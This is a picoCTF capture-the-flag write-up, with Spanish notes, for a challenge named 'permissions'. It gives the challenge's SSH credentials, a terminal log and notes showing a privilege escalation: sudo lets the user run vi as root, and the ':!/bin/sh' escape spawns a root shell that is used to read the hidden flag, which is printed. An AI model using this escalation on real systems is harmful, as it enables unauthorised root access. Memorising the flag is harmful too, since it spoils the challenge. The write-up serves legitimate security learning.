## permissions

## Descripcion
Can you read files in the root file? The system admin has provisioned an account for you on the main server: `ssh -p 54813 picoplayer@saturn.picoctf.net` Password: `vCR2tuwCRm` Can you login and read the root file?
## Solucion
```
┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ ssh -p 54813 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:54813 ([13.59.203.175]:54813)' can't be established.
ED25519 key fingerprint is: SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:54813' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
picoplayer@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$

picoplayer@challenge:~$ sudo vi prueba
[sudo] password for picoplayer:

root@challenge:/home/picoplayer# cd ..
root@challenge:/home# cd ..
root@challenge:/# cd root
root@challenge:~# ls
root@challenge:~# pwd
/root
root@challenge:~# ls
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 16 18:24 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
root@challenge:~#
```
## Notas
- El reto nos pide entrar a la carpeta root del sistema para poder ver un archivo que contiene la bandera, con los permisos actuales no podemos hacer esto
- con el comando sudo -l podemos ver que privilegios de sudo tenemos
- observamos que podemos usar el editor vi con sudo, esto nos permitira ejecutar vi como root en cualquier archivo
- creamos un archivo de prueba y ponemos lo siguiente: :!/bin/sh que lo que hace es que genera un shell del sistema interactivo con vi
- ya tenemos privilegios mas altos y podemos navegar a la carpeta root, listamos los archivos incluidos los ocultos y vemos que hay un archivo .flag.txt 
- facilmente vemos el contenido del archivo con un cat y obtenemos la bandera:picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
## Referencias
- https://superuser.com/questions/553932/how-to-check-if-i-have-sudo-access
- https://gtfobins.org/gtfobins/vi/